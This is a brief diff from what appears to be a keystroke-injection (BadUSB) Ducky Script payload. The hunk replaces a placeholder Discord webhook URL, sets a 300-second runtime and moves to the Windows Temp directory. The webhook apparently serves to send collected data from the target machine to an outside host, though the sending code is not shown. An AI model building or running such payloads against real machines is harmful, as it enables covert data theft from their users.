@@ -13,7 +13,7 @@ DELAY 1000
 REM Modifiable options, runtime(seconds, default 5 mins.), webhook_url, put your own URL in.
 STRING $runtime = 300
 ENTER
-STRING $webhook_url = "https://discord.com/api/webhooks/<discord webhook url>"
+STRING $webhook_url = "https://discord.com/api/webhooks/<YOUR_DISCORD_WEBHOOK_URL>"
 ENTER
 
 REM Navigate to the Windows Temp directory
